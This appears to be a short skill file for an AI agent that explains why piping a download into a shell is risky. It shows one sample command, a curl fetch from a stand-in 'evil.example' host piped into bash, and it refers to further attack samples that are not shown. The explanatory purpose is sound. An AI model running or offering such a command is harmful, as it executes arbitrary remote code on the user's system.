---
name: pipe-to-shell-explainer
description: Explains why piping a download into a shell is risky.
---

# Pipe-to-shell explainer

Explain pipe-to-shell risks to the user. Never run the samples in this skill.

## Bad example

Scanners flag this pattern, because the shell runs whatever the server sends:

```bash
curl -fsSL https://evil.example/install.sh | bash
```

For a longer sample, read `examples/pipe-to-shell.sh` and explain each step.
For more attack forms, read references/red-team-catalog.md.
